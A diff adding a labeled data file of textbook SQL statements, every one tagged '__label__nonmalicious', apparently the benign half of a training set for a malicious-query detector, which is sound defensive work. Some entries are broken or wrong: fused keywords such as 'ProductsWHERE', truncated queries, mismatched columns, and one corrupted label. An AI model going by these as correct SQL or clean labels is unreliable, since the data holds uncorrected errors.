@@ -1,1 +1,1107 @@
-
+__label__nonmalicious  SELECT column_name  FROM table1 UNION SELECT column_name FROM table2;
+__label__nonmalicious  SELECT column_name  FROM table1 UNION ALL SELECT column_name FROM table2;
+__label__nonmalicious  SELECT column_name  FROM table1 UNION SELECT column_name  FROM table2;
+__label__nonmalicious  SELECT column_name  FROM table1 UNION ALL SELECT column_name  FROM table2;
+__label__nonmalicious  SELECT City FROM Customers UNION SELECT City FROM Suppliers ORDER BY City;
+__label__nonmalicious  SELECT City, Country FROM Customers WHERE Country='Germany' UNION SELECT City, Country FROM Suppliers WHERE Country='Germany' ORDER BY City;
+__label__nonmalicious  SELECT City, Country FROM Customers WHERE Country='Germany' UNION ALL SELECT City, Country FROM Suppliers WHERE Country='Germany' ORDER BY City;
+__label__nonmalicious  SELECT 'Customer' AS Type, ContactName, City, Country FROM Customers UNION SELECT 'Supplier', ContactName, City, Country FROM Suppliers;
+__label__nonmalicious  SELECT column_name  FROM table_name WHERE condition GROUP BY column_name  ORDER BY column_name ;
+__label__nonmalicious  SELECT COUNT(CustomerID), Country FROM Customers GROUP BY Country;
+__label__nonmalicious  SELECT COUNT(CustomerID), Country FROM Customers GROUP BY Country ORDER BY COUNT(CustomerID) DESC;
+__label__nonmalicious  SELECT Shippers.ShipperName, COUNT(Orders.OrderID) AS NumberOfOrders FROM Orders LEFT JOIN Shippers ON Orders.ShipperID = Shippers.ShipperID GROUP BY ShipperName;
+__label__nonmalicious  SELECT column_name  FROM table_name WHERE condition GROUP BY column_name  HAVING condition ORDER BY column_name ;
+__label__nonmalicious  SELECT * FROM Customers;
+__label__nonmalicious  SELECT CustomerName, City FROM Customers;
+__label__nonmalicious  SELECT DISTINCT Country FROM Customers;
+__label__nonmalicious  SELECT COUNT(DISTINCT Country) FROM Customers;
+__label__nonmalicious  SELECT Count(*) AS DistinctCountries FROM (SELECT DISTINCT Country FROM Customers);
+__label__nonmalicious  SELECT * FROM Customers WHERE Country='Mexico'; 
+__label__nonmalicious  SELECT * FROM Customers WHERE CustomerID=1; 
+__label__nonmalicious  SELECT column1, column2 FROM table_name WHERE condition1 AND condition2 AND condition3;
+__label__nonmalicious  SELECT column1, column2 FROM table_name WHERE condition1 OR condition2 OR condition3;
+__label__nonmalicious  SELECT column1, column2 FROM table_name WHERE NOT condition; 
+__label__nonmalicious  SELECT * FROM Customers WHERE Country='Germany' AND City='Berlin'; 
+__label__nonmalicious  SELECT * FROM Customers WHERE City='Berlin' OR City='Mأ¼nchen';
+__label__nonmalicious  SELECT * FROM Customers WHERE Country='Germany' OR Country='Spain';
+__label__nonmalicious  SELECT * FROM Customers WHERE NOT Country='Germany';
+__label__nonmalicious  SELECT * FROM Customers WHERE Country='Germany' AND (City='Berlin' OR City='Mأ¼nchen'); 
+__label__nonmalicious  SELECT * FROM Customers WHERE NOT Country='Germany' AND NOT Country='USA';
+__label__nonmalicious  SELECT column1, column2 FROM table_name ORDER BY column1, column2 ASC;
+__label__nonmalicious  SELECT column1, column2 FROM table_name ORDER BY column1, column2 DESC;
+__label__nonmalicious  SELECT * FROM Customers ORDER BY Country;
+__label__nonmalicious  SELECT * FROM Customers ORDER BY Country DESC;
+__label__nonmalicious  SELECT * FROM Customers ORDER BY Country, CustomerName; 
+__label__nonmalicious  SELECT * FROM Customers ORDER BY Country ASC, CustomerName DESC;  
+__label__nonmalicious  INSERT INTO table_name (column1, column2, column3) VALUES (value1, value2,value3);
+__label__nonmalicious  INSERT INTO table_name VALUES (value1, value2, value3); 
+__label__nonmalicious  INSERT INTO Customers (CustomerName, ContactName, Address, City, PostalCode, Country) VALUES ('Cardinal', 'Tom B. Erichsen', 'Skagen 21', 'Stavanger', '4006', 'Norway');  
+__label__nonmalicious  INSERT INTO Customers (CustomerName, City, Country) VALUES ('Cardinal', 'Stavanger', 'Norway'); 
+__label__nonmalicious  SELECT column_names FROM table_name WHERE column_name IS NULL;
+__label__nonmalicious  SELECT column_namesFROM table_name WHERE column_name IS NOT NULL; 
+__label__nonmalicious  SELECT CustomerName, ContactName, Address FROM Customers WHERE Address IS NULL;
+__label__nonmalicious  SELECT CustomerName, ContactName, Address FROM Customers WHERE Address IS NOT NULL;
+__label__nonmalicious  UPDATE table_name SET column1 = value1, column2 = value2 WHERE condition; 
+__label__nonmalicious  UPDATE Customers SET ContactName = 'Alfred Schmidt', City= 'Frankfurt' WHERE CustomerID = 1;
+__label__nonmalicious  DELETE FROM table_name WHERE condition;
+__label__nonmalicious  DELETE FROM Customers WHERE CustomerName='Alfreds Futterkiste';
+__label__nonmalicious  DELETE FROM table_name;
+__label__nonmalicious  DELETE FROM Customers;
+__label__nonmalicious  SELECT column1, column2 FROM table_name; 
+__label__nonmalicious  SELECT * FROM table_name; 
+__label__nonmalicious  SELECT CustomerName, City FROM Customers;
+__label__nonmalicious  SELECT DISTINCT column1, column2 FROM table_name;
+__label__nonmalicious  SELECT COUNT(CustomerID), Country FROM Customers GROUP BY Country HAVING COUNT(CustomerID) > 5;
+__label__nonmalicious  SELECT COUNT(CustomerID), Country FROM Customers GROUP BY Country HAVING COUNT(CustomerID) > 5 ORDER BY COUNT(CustomerID) DESC;
+__label__nonmalicious  SELECT column_name  FROM table_name WHERE EXISTS (SELECT column_name FROM table_name WHERE condition);
+__label__nonmalicious  SELECT SupplierName FROM Suppliers WHERE EXISTS (SELECT ProductName FROM Products WHERE Products.SupplierID = Suppliers.supplierID AND Price < 20);
+__label__nonmalicious  SELECT SupplierName FROM Suppliers WHERE EXISTS (SELECT ProductName FROM Products WHERE Products.SupplierID = Suppliers.supplierID AND Price = 22);
+__label__nonmalicious  SELECT column_name  FROM table_name WHERE column_name operator ANY (SELECT column_name FROM table_name WHERE condition);
+__label__nonmalicious  SELECT ALL column_name  FROM table_name WHERE condition;
+__label__nonmalicious  SELECT column_name  FROM table_name WHERE column_name operator ALL (SELECT column_name FROM table_name WHERE condition);
+__label__nonmalicious  SELECT ProductName FROM Products WHERE ProductID = ANY (SELECT ProductID FROM OrderDetails WHERE Quantity = 10);
+__label__nonmalicious  SELECT ProductName FROM Products WHERE ProductID = ANY (SELECT ProductID FROM OrderDetails WHERE Quantity > 99);
+__label__nonmalicious  SELECT ProductName FROM Products WHERE ProductID = ANY (SELECT ProductID FROM OrderDetails WHERE Quantity > 1000);
+__label__nonmalicious  SELECT ALL ProductName FROM Products WHERE TRUE;
+__label__nonmalicious  SELECT ProductName FROM Products WHERE ProductID = ALL (SELECT ProductID FROM OrderDetails WHERE Quantity = 10);
+__label__nonmalicious  SELECT * INTO newtable [IN externaldb] FROM oldtable WHERE condition;
+__label__nonmalicious  SELECT * INTO CustomersBackup2017 FROM Customers;
+__label__nonmalicious  SELECT * INTO CustomersBackup2017 IN 'Backup.mdb' FROM Customers;
+__label__nonmalicious  SELECT CustomerName, ContactName INTO CustomersBackup2017 FROM Customers;
+__label__nonmalicious  SELECT * INTO CustomersGermany FROM Customers WHERE Country = 'Germany';
+__label__nonmalicious  SELECT Customers.CustomerName, Orders.OrderID INTO CustomersOrderBackup2017 FROM Customers LEFT JOIN Orders ON Customers.CustomerID = Orders.CustomerID;
+__label__nonmalicious  SELECT * INTO newtable FROM oldtable WHERE 1 = 0;
+__label__nonmalicious  INSERT INTO table2 SELECT * FROM table1 WHERE condition;
+__label__nonmalicious  INSERT INTO table2 (column1, column2, column3, ...) SELECT column1, column2, column3 FROM table1 WHERE condition;
+__label__nonmalicious  INSERT INTO Customers (CustomerName, City, Country) SELECT SupplierName, City, Country FROM Suppliers;
+__label__nonmalicious  INSERT INTO Customers (CustomerName, ContactName, Address, City, PostalCode, Country) SELECT SupplierName, ContactName, Address, City, PostalCode, Country FROM Suppliers;
+__label__nonmalicious  INSERT INTO Customers (CustomerName, City, Country) SELECT SupplierName, City, Country FROM Suppliers WHERE Country='Germany';
+__label__nonmalicious  SELECT OrderID, Quantity, CASE WHEN Quantity > 30 THEN 'The quantity is greater than 30' WHEN  Quantity = 30 THEN 'The quantity is 30' ELSE 'The quantity is under 30' END AS QuantityText FROM OrderDetails;
+__label__nonmalicious  SELECT CustomerName, City, Country FROM Customers ORDER BY (CASE WHEN City IS NULL THEN Country ELSE City END);
+__label__nonmalicious  SELECT ProductName, UnitPrice * (UnitsInStock + UnitsOnOrder) FROM Products;
+__label__nonmalicious  SELECT ProductName, UnitPrice * (UnitsInStock + IFNULL(UnitsOnOrder, 0)) FROM Products;
+__label__nonmalicious  SELECT ProductName, UnitPrice * (UnitsInStock + COALESCE(UnitsOnOrder, 0)) FROM Products;
+__label__nonmalicious  SELECT ProductName, UnitPrice * (UnitsInStock + ISNULL(UnitsOnOrder, 0)) FROM Products;
+__label__nonmalicious  SELECT ProductName, UnitPrice * (UnitsInStock + IIF(IsNull(UnitsOnOrder), 0, UnitsOnOrder)) FROM Products;
+__label__nonmalicious  SELECT ProductName, UnitPrice * (UnitsInStock + NVL(UnitsOnOrder, 0)) FROM Products;
+__label__nonmalicious  SELECT * FROM Customers -- WHERE City='Berlin';
+__label__nonmalicious  SELECT * FROM Products;
+__label__nonmalicious  SELECT 30 + 20;
+__label__nonmalicious  SELECT * FROM Products WHERE Price = 18;
+__label__nonmalicious  SELECT * FROM Products WHERE Price > 40;
+__label__nonmalicious  SELECT * FROM Products WHERE Price < 50;
+__label__nonmalicious  SELECT * FROM Products WHERE Price >= 20;
+__label__nonmalicious  SELECT * FROM ProductsWHERE Price <= 30;
+__label__nonmalicious  SELECT * FROM Products WHERE Price <> 18;
+__label__nonmalicious  SELECT * FROM Employees WHERE Age <> 33;
+__label__nonmalicious  SELECT ProductName FROM Products WHERE ProductID = ALL (SELECT ProductID FROM OrderDetails WHERE Quantity = 10);
+__label__nonmalicious  SELECT * FROM Customers WHERE City = "London" AND Country = "UK";
+__label__nonmalicious  SELECT * FROM Products WHERE Price > ANY (SELECT Price FROM Products WHERE Price > 50);
+__label__nonmalicious  SELECT * FROM Products WHERE Price BETWEEN 50 AND 60;
+__label__nonmalicious  SELECT SupplierName FROM Suppliers WHERE EXISTS (SELECT ProductName FROM Products WHERE Products.SupplierID = Suppliers.supplierID AND Price < 20);
+__label__nonmalicious  SELECT * FROM Customers WHERE City IN ('Paris','London');
+__label__nonmalicious  SELECT * FROM Customers WHERE City LIKE 's%';
+__label__nonmalicious  SELECT * FROM Customers WHERE City NOT LIKE 's%';
+__label__nonmalicious  SELECT * FROM Customers WHERE City = "London" OR Country = "UK";
+"__label__nonmalicious  SELECT * FROM Products
+WHERE Price > SOME (SELECT Price FROM Products WHERE Price > 20);"
+__label__nonmalicious  SELECT 30 - 20;
+__label__nonmalicious  SELECT 30 * 25;
+__label__nonmalicious  SELECT 30 / 10;
+__label__nonmalicious  SELECT 17 % 5;
+__label__nonmalicious  SELECT column_name  FROM table1 LEFT JOIN table2 ON table1.column_name = table2.column_name;
+__label__nonmalicious  SELECT Customers.CustomerName, Orders.OrderID FROM Customers LEFT JOIN Orders ON Customers.CustomerID = Orders.CustomerID ORDER BY Customers.CustomerName;
+__label__nonmalicious  SELECT column_name  FROM table1 RIGHT JOIN table2 ON table1.column_name = table2.column_name;
+__label__nonmalicious  SELECT Orders.OrderID, Employees.LastName, Employees.FirstName FROM Orders RIGHT JOIN Employees ON Orders.EmployeeID = Employees.EmployeeID ORDER BY Orders.OrderID;
+__label__nonmalicious  SELECT column_name  FROM table1 FULL OUTER JOIN table2 ON table1.column_name = table2.column_name WHERE condition;
+__label__nonmalicious  SELECT Customers.CustomerName, Orders.OrderID FROM Customers FULL OUTER JOIN Orders ON Customers.CustomerID=Orders.CustomerID ORDER BY Customers.CustomerName;
+__label__nonmalicious  SELECT column_name  FROM table1 T1, table1 T2 WHERE condition;
+__label__nonmalicious  SELECT A.CustomerName AS CustomerName1, B.CustomerName AS CustomerName2, A.City FROM Customers A, Customers B WHERE A.CustomerID <> B.CustomerID AND A.City = B.City ORDER BY A.City;
+__label__nonmalicious  SELECT * FROM Customers;
+__label__nonmalicious  SELECT CustomerName,City FROM Customers;
+__label__nonmalicious  SELECT * FROM Products;
+__label__nonmalicious  SELECT DISTINCT Country FROM Customers;
+__label__nonmalicious  SELECT COUNT(DISTINCT Country) FROM Customers;
+__label__nonmalicious  SELECT Count(*) AS DistinctCountries FROM (SELECT DISTINCT Country FROM Customers);
+__label__nonmalicious  SELECT * FROM Customers WHERE Country='Mexico';
+__label__nonmalicious  SELECT * FROM Customers WHERE CustomerID=1;
+__label__nonmalicious  SELECT * FROM Products WHERE ProductID=1;
+__label__nonmalicious  SELECT * FROM Employees WHERE Country='Milan' AND City='Rome';
+__label__nonmalicious  SELECT * FROM Students WHERE City='Milan' OR City='Rome';
+__label__nonmalicious  SELECT * FROM Students WHERE NOT Country='France';
+__label__nonmalicious  SELECT * FROM Employees WHERE Country='Italy' AND (City='Milan' OR City='Rome');
+__label__nonmalicious  SELECT * FROM Employees ORDER BY Country;
+__label__nonmalicious  SELECT * FROM Employees WHERE Country='Italy' AND (City='Rome' OR City='Milan');
+__label__nonmalicious  SELECT * FROM Students ORDER BY Grade;
+__label__nonmalicious  SELECT * FROM Emplyee ORDER BY Salary;
+__label__nonmalicious  SELECT * FROM Employee ORDER BY Salary DESC;
+__label__nonmalicious  SELECT * FROM Customers ORDER BY Country, CustomerName;
+__label__nonmalicious  INSERT INTO Customers (CustomerName, ContactName, Address, City, PostalCode, Country) VALUES ('Sam','Tom B. Erichsen','Skagen 24','Stavanger','2106','Norway');
+__label__nonmalicious  INSERT INTO Students (StudentName, Grade, Country) VALUES ('Goerge', 'C+', 'France');
+__label__nonmalicious  SELECT Name, Contact, Address FROM Employee WHERE Address IS NULL;
+__label__nonmalicious  SELECT CustomerName, ContactName, Address FROM Customers WHERE Address IS NOT NULL;
+__label__nonmalicious  SELECT TOP 3 * FROM Employee;
+__label__nonmalicious  SELECT * FROM Customers LIMIT 5;
+__label__nonmalicious  SELECT * FROM Employee LIMIT 8;
+__label__nonmalicious  SELECT OrderID, quality, CASE WHEN Quantity > 30 THEN 'The quantity is greater than 30' WHEN Quantity = 30 THEN 'The quantity is 30' ELSE 'The quantity is under 30' END AS QuantityText FROM OrderDetails;
+__label__nonmalicious  SELECT Name, place, Country FROM orders ORDER BY (CASE WHEN City IS NULL THEN Country ELSE City END);
+__label__nonmalicious  INSERT INTO orders (product, country, employees) SELECT SupplierName, City, Country FROM Suppliers WHERE Country='Germany';
+__label__nonmalicious  INSERT INTO Customers (employees, product, Country) SELECT SupplierName, City, Country FROM Suppliers;
+__label__nonmalicious  SELECT ALL ProductName FROM Products WHERE TRUE
+__label__nonmalicious  SELECT ProductName FROM Products WHERE ProductID = ANY (SELECT ProductID FROM OrderDetails WHERE Quantity = 10);
+__label__nonmalicious  SELECT SupplierName FROM Suppliers WHERE EXISTS (SELECT ProductName FROM Products WHERE Products.SupplierID = Suppliers.supplierID AND Price < 20);
+__label__nonmalicious  SELECT COUNT(CustomerID), Country FROM Customers GROUP BY Country HAVING COUNT(CustomerID) > 5 ORDER BY COUNT(CustomerID) DESC;
+__label__nonmalicious  SELECT Shippers.ShipperName,COUNT(Orders.OrderID) AS NumberOfOrders FROM Orders LEFT JOIN Shippers ON Orders.ShipperID = Shippers.ShipperID GROUP BY ShipperName;
+__label__nonmalicious  SELECT COUNT(orders), emplyees FROM orders GROUP BY Country ORDER BY COUNT(CustomerID) DESC;
+__label__nonmalicious  SELECT COUNT(employees), orders FROM Customers GROUP BY Country;
+__label__nonmalicious  SELECT COUNT(supplierID), city FROM orders GROUP BY Country ORDER BY COUNT(CustomerID) DESC;
+__label__nonmalicious  CREATE DATABASE databasename; 
+__label__nonmalicious  CREATE DATABASE testDB;
+__label__nonmalicious  DROP DATABASE databasename; 
+__label__nonmalicious  DROP DATABASE testDB;
+__label__nonmalicious  BACKUP DATABASE databasename TO DISK = 'filepath'; 
+__label__nonmalicious  BACKUP DATABASE databasename TO DISK = 'filepath' WITH DIFFERENTIAL; 
+__label__nonmalicious  BACKUP DATABASE testDB TO DISK = 'D:\backups\testDB.bak';
+__label__nonmalicious  BACKUP DATABASE testDB TO DISK = 'D:\backups\testDB.bak' WITH DIFFERENTIAL 
+__label__nonmalicious  CREATE TABLE table_name (column1 datatype,column2 datatype,column3 datatype,);
+__label__nonmalicious  CREATE TABLE Persons (PersonID int,LastName varchar(255),FirstName varchar(255),Address varchar(255),City varchar(255));
+__label__nonmalicious  CREATE TABLE new_table_name AS SELECT column1, column2 FROM existing_table_name WHERE;
+__label__nonmalicious  CREATE TABLE TestTable AS SELECT customername, contactname FROM customers; 
+__label__nonmalicious  DROP TABLE table_name; 
+__label__nonmalicious  DROP TABLE Shippers;
+__label__nonmalicious  TRUNCATE TABLE table_name; 
+__label__nonmalicious  ALTER TABLE table_name ADD column_name datatype;  
+__label__nonmalicious  ALTER TABLE Customers ADD Email varchar(255);
+__label__nonmalicious  ALTER TABLE table_name DROP COLUMN column_name 
+__label__nonmalicious  ALTER TABLE Customers DROP COLUMN Email;
+__label__nonmalicious  ALTER TABLE table_name ALTER COLUMN column_name datatype; 
+__label__nonmalicious  ALTER TABLE table_name MODIFY COLUMN column_name datatype; 
+__label__nonmalicious  ALTER TABLE table_name MODIFY column_name datatype; 
+__label__nonmalicious  ALTER TABLE Persons ADD DateOfBirth date; 
+__label__nonmalicious  ALTER TABLE Persons ALTER COLUMN DateOfBirth year
+__label__nonmalicious  ALTER TABLE Persons DROP COLUMN DateOfBirth; 
+__label__nonmalicious  CREATE TABLE table_name (column1 datatype constraint,column2 datatype constraint,column3 datatype constraint,);
+__label__nonmalicious  CREATE TABLE Persons (ID int NOT NULL,LastName varchar(255) NOT NULL,FirstName varchar(255) NOT NULL,Age int); 
+__label__nonmalicious  ALTER TABLE Persons MODIFY Age int NOT NULL; 
+__label__nonmalicious  CREATE TABLE Persons (ID int NOT NULL UNIQUE,LastName varchar(255) NOT NULL,FirstName varchar(255),Age int);
+__label__nonmalicious  CREATE TABLE Persons (ID int NOT NULL,LastName varchar(255) NOT NULL,FirstName varchar(255),Age int,UNIQUE (ID));
+__label__nonmalicious  CREATE TABLE Persons (ID int NOT NULL,LastName varchar(255) NOT NULL,FirstName varchar(255),Age int,PRIMARY KEY (ID));
+__label__nonmalicious  SELECT TOP number|percent column_name  FROM table_name WHERE condition;
+__label__nonmalicious  SELECT column_name  FROM table_name WHERE condition LIMIT number;
+__label__nonmalicious  SELECT column_name  FROM table_name ORDER BY column_name  FETCH FIRST number ROWS ONLY;
+__label__nonmalicious  SELECT column_name  FROM table_name WHERE ROWNUM <= number;
+__label__nonmalicious  WITH t1 AS (SELECT AVG(Sales) AVG_SALES FROM Store_Sales) SELECT a1.* FROM Store_Sales a1, t1 WHERE a1.Sales > t1.AVG_SALES;
+__label__nonmalicious  SELECT TOP 3 * FROM Customers;
+__label__nonmalicious  SELECT * FROM Customers;
+__label__nonmalicious  SELECT * FROM Products;
+__label__nonmalicious  SELECT TOP 50 PERCENT * FROM Customers;
+__label__nonmalicious  SELECT * FROM Students;
+__label__nonmalicious  SELECT TOP 3 * FROM Customers WHERE Country='Germany';
+__label__nonmalicious  SELECT * FROM Customers WHERE Country='Germany' LIMIT 3;
+__label__nonmalicious  SELECT * FROM Customers WHERE Country='Germany' FETCH FIRST 3 ROWS ONLY;
+__label__nonmalicious  SELECT MIN(column_name)
+__label__nonmalicious  SELECT MAX(column_name)
+__label__nonmalicious  SELECT MIN(Price) AS SmallestPrice FROM Products;
+__label__nonmalicious  SELECT MAX(Price) AS LargestPrice FROM Products;
+__label__nonmalicious  SELECT COUNT(column_name) FROM table_name WHERE condition;
+__label__nonmalicious  SELECT AVG(column_name)
+__label__nonmalicious  SELECT SUM(column_name)
+__label__nonmalicious  SELECT COUNT(ProductID)
+__label__nonmalicious  SELECT AVG(Price) FROM Products;
+__label__nonmalicious  SELECT SUM(Quantity) FROM OrderDetails;
+__label__nonmalicious  SELECT column1, column2, ... FROM table_name
+__label__nonmalicious  SELECT * FROM Customers WHERE CustomerName LIKE 'a%';
+__label__nonmalicious  SELECT * FROM Customers WHERE CustomerName LIKE '%a';
+__label__nonmalicious  SELECT * FROM Customers WHERE CustomerName LIKE '%or%';
+__label__nonmalicious  SELECT * FROM Customers WHERE CustomerName LIKE '_r%';
+__label__nonmalicious  SELECT * FROM Customers WHERE CustomerName LIKE 'a__%'
+__label__nonmalicious  SELECT * FROM Customers WHERE ContactName LIKE 'a%o';
+__label__nonmalicious  SELECT * FROM Customers WHERE CustomerName NOT LIKE 'a%';
+__label__nonmalicious  SELECT * FROM Customers WHERE City LIKE 'ber%';
+__label__nonmalicious  SELECT * FROM Customers WHERE City LIKE '%es%';
+__label__nonmalicious  SELECT * FROM Customers WHERE City LIKE '_ondon';
+__label__nonmalicious  SELECT * FROM Customers WHERE City LIKE 'L_n_on'
+__label__nonmalicious  SELECT * FROM Customers WHERE City LIKE '[bsp]%';
+__label__nonmalicious  SELECT * FROM Customers WHERE City LIKE '[a-c]%';
+__label__nonmalicious  SELECT * FROM Customers WHERE City LIKE '[!bsp]%';
+__label__nonmalicious  SELECT * FROM Customers WHERE City NOT LIKE '[bsp]%';
+__label__nonmalicious  SELECT column_name  FROM table_name WHERE column_name IN (value1, value2, ...);
+__label__nonmalicious  SELECT column_name  FROM table_name WHERE column_name IN (SELECT STATEMENT);
+__label__nonmalicious  SELECT * FROM Customers WHERE Country IN ('Germany', 'France', 'UK');
+__label__nonmalicious  SELECT * FROM Customers WHERE Country NOT IN ('Germany', 'France', 'UK');
+__label__nonmalicious  SELECT * FROM Customers WHERE Country IN (SELECT Country FROM Suppliers);
+__label__nonmalicious  SELECT column_name  FROM table_name WHERE column_name BETWEEN value1 AND value2;
+__label__nonmalicious  SELECT * FROM Products WHERE Price BETWEEN 10 AND 20;
+__label__nonmalicious  SELECT * FROM Products WHERE Price NOT BETWEEN 10 AND 20;
+__label__nonmalicious  SELECT * FROM Products WHERE Price BETWEEN 10 AND 20 AND CategoryID NOT IN (1,2,3);
+__label__nonmalicious  SELECT * FROM Products WHERE ProductName BETWEEN 'Carnarvon Tigers' AND 'Mozzarella di Giovanni'
+__label__nonmalicious  SELECT * FROM Products WHERE ProductName BETWEEN "Carnarvon Tigers" AND "Chef Anton's Cajun Seasoning"
+__label__nonmalicious  SELECT * FROM Products WHERE ProductName NOT BETWEEN 'Carnarvon Tigers' AND 'Mozzarella di Giovanni'
+__label__nonmalicious  SELECT * FROM Orders WHERE OrderDate BETWEEN #07/01/1996# AND #07/31/1996#;
+__label__nonmalicious  SELECT * FROM Orders WHERE OrderDate BETWEEN '1996-07-01' AND '1996-07-31';
+__label__nonmalicious  SELECT column_name AS alias_name FROM table_name;
+__label__nonmalicious  SELECT column_name  FROM table_name AS alias_name;
+__label__no.9nmalicious  SELECT CustomerID AS ID, CustomerName AS Customer FROM Customers;
+__label__nonmalicious  SELECT CustomerName AS Customer, ContactName AS [Contact Person] FROM Customers;
+__label__nonmalicious  SELECT CustomerName, Address + ', ' + PostalCode + ' ' + City + ', ' + Country AS Address FROM Customers;
+__label__nonmalicious  SELECT CustomerName, CONCAT(Address,', ',PostalCode,', ',City,', ',Country) AS Address FROM Customers;
+__label__nonmalicious  SELECT o.OrderID, o.OrderDate, c.CustomerName FROM Customers AS c, Orders AS o WHERE c.CustomerName='Around theHorn' AND c.CustomerID=o.CustomerID;
+__label__nonmalicious  SELECT Orders.OrderID, Orders.OrderDate, Customers.CustomerName FROM Customers, Orders WHERE Customers.CustomerName='Around the Horn' AND Customers.CustomerID=Orders.CustomerID;
+__label__nonmalicious  SELECT Orders.OrderID, Customers.CustomerName, Orders.OrderDate FROM Orders INNER JOIN Customers ON Orders.CustomerID=Customers.CustomerID;
+__label__nonmalicious  SELECT column_name  FROM table1 INNER JOIN table2 ON table1.column_name = table2.column_name;
+__label__nonmalicious  SELECT Orders.OrderID, Customers.CustomerName FROM Orders INNER JOIN Customers ON Orders.CustomerID = Customers.CustomerID;
+__label__nonmalicious  SELECT Orders.OrderID, Customers.CustomerName, Shippers.ShipperName FROM ((Orders INNER JOIN Customers ON Orders.CustomerID = Customers.CustomerID)INNER JOIN Shippers ON Orders.ShipperID = Shippers.ShipperID);
+__label__nonmalicious  SELECT TOP 30 PERCENT * FROM Customers;
+__label__nonmalicious  SELECT TOP 70 PERCENT * FROM Customers;
+__label__nonmalicious  SELECT TOP 2 * FROM Customers WHERE Country='Milan';
+__label__nonmalicious  SELECT MIN(Price) AS SmallestPrice FROM Games; 
+__label__nonmalicious  SELECT MAX(Price) AS Largest FROM Stuff; 
+__label__nonmalicious  SELECT COUNT(ID) FROM Products;
+__label__nonmalicious  SELECT AVG(Price) FROM Products;
+__label__nonmalicious  SELECT SUM(Quantity) FROM Order;
+__label__nonmalicious  SELECT SUM(Price) FROM Products;
+__label__nonmalicious  SELECT * FROM Customers WHERE CustomerName LIKE 'a%';
+__label__nonmalicious  SELECT * FROM Customers WHERE CustomerName LIKE '%a';
+__label__nonmalicious  SELECT * FROM Customers WHERE CustomerName LIKE '%b';
+__label__nonmalicious  SELECT * FROM Customers WHERE CustomerName LIKE '%c';
+__label__nonmalicious  SELECT * FROM Customers WHERE CustomerName LIKE '%s';
+__label__nonmalicious  SELECT * FROM Employees WHERE EmployeeName LIKE 'x%';
+__label__nonmalicious  SELECT * FROM Employees WHERE EmployeeName LIKE 'as%'
+__label__nonmalicious  SELECT * FROM Employees WHERE EmployeeName LIKE 'Ab%';
+__label__nonmalicious  SELECT * FROM Employees WHERE EmployeeName LIKE 'k%';
+__label__nonmalicious  SELECT * FROM Employees WHERE EmployeeName LIKE 'o%';
+__label__nonmalicious  SELECT * FROM Employees WHERE EmployeeName LIKE 'l%';
+__label__nonmalicious  SELECT * FROM Customers WHERE CustomerName LIKE '%or%'
+__label__nonmalicious  SELECT * FROM Emp WHERE EmpName LIKE '%are%'
+__label__nonmalicious  SELECT * FROM Std WHERE StdName LIKE '%br%'
+__label__nonmalicious  SELECT * FROM Customers WHERE CustomerName LIKE '%ok%'
+__label__nonmalicious  SELECT * FROM Customers WHERE CustomerName LIKE '%oe%'
+__label__nonmalicious  SELECT * FROM Customers WHERE CustomerName LIKE '%ae%'
+__label__nonmalicious  SELECT * FROM Customers WHERE CustomerName LIKE '%ei%'
+__label__nonmalicious  SELECT * FROM Customers WHERE CustomerName LIKE '_r%';
+__label__nonmalicious  SELECT * FROM Employee WHERE Name LIKE '_r%';
+__label__nonmalicious  SELECT * FROM Student WHERE Name LIKE '_s%';
+__label__nonmalicious  SELECT * FROM Product WHERE City LIKE '_l%';
+__label__nonmalicious  SELECT * FROM Customers WHERE Country LIKE '_h%';
+__label__nonmalicious  SELECT * FROM Employee WHERE ContactName LIKE 'a%o';
+__label__nonmalicious  SELECT * FROM Employee WHERE ContactName LIKE 'a%o';
+__label__nonmalicious  SELECT * FROM Customers WHERE ContactName LIKE 't%y';
+__label__nonmalicious  SELECT * FROM Customers WHERE ContactName LIKE 'a%f';
+__label__nonmalicious  SELECT * FROM Customers WHERE Name LIKE 'a%s';
+__label__nonmalicious  SELECT * FROM Customers WHERE Country LIKE 'r%m';
+__label__nonmalicious  SELECT * FROM Customers WHERE LastName LIKE 'i%o';
+__label__nonmalicious  SELECT * FROM Customers WHERE City LIKE 'a%f';
+__label__nonmalicious  SELECT * FROM Customers WHERE Card LIKE 'a%k';
+__label__nonmalicious  SELECT * FROM Customers WHERE ContactName LIKE 's%o';
+__label__nonmalicious  SELECT * FROM Customers WHERE ContactName LIKE 'j%d';
+__label__nonmalicious  SELECT * FROM Customers WHERE Country LIKE 's%p';
+__label__nonmalicious  SELECT * FROM Employee WHERE ContactName LIKE 'b%s';
+__label__nonmalicious  SELECT * FROM Employee WHERE City LIKE 'ber%';
+__label__nonmalicious  SELECT * FROM Student WHERE City LIKE 'ber%';
+__label__nonmalicious  SELECT * FROM Student WHERE City LIKE 'mil%';
+__label__nonmalicious  SELECT * FROM Student WHERE City LIKE 'sau%';
+__label__nonmalicious  SELECT * FROM Student WHERE City LIKE 'riy%';
+__label__nonmalicious  SELECT * FROM Employee WHERE Country LIKE 'egy%';
+__label__nonmalicious  SELECT * FROM Employee WHERE City LIKE 'jed%';
+__label__nonmalicious  SELECT * FROM Employee WHERE City LIKE 'see%';
+__label__nonmalicious  SELECT * FROM Employee WHERE City LIKE 'lon%';
+__label__nonmalicious  SELECT * FROM Product WHERE City LIKE 'ge%';
+__label__nonmalicious  SELECT * FROM Customers WHERE City LIKE '_ondon';
+__label__nonmalicious  SELECT * FROM Ptoducts WHERE City LIKE '[bsp]%'; 
+__label__nonmalicious  SELECT * FROM Customers WHERE City LIKE '[!ffg]%';
+__label__nonmalicious  SELECT * FROM Customers WHERE City IN ('Germany', 'France', 'UK');
+__label__nonmalicious  SELECT * FROM Students WHERE Country NOT IN ('Germany', 'Italy', 'Saudi Arabia');
+__label__nonmalicious  CREATE TABLE Employee_Info (EmployeeID int, EmployeeName varchar(255), Emergency ContactName varchar(255), PhoneNumber int, Address varchar(255), City varchar(255), Country varchar(255))
+__label__nonmalicious  SELECT Student_ID FROM STUDENT;
+__label__nonmalicious  SELECT * FROM STUDENT;
+__label__nonmalicious  SELECT EMP_ID, NAME FROM EMPLOYEE_TBL WHERE EMP_ID = '0000';
+__label__nonmalicious  SELECT EMP_ID, LAST_NAME FROM EMPLOYEE WHERE CITY = 'Seattle' ORDER BY EMP_ID;
+__label__nonmalicious  SELECT Name, Age FROM Patients WHERE Age > 40 GROUP BY Name, Age ORDER BY Name;
+__label__nonmalicious  SELECT COUNT(price), price FROM orders WHERE price < 70 GROUP BY price ORDER BY price;
+__label__nonmalicious  SELECT COUNT(CustomerID), Country FROM Customers GROUP BY Country
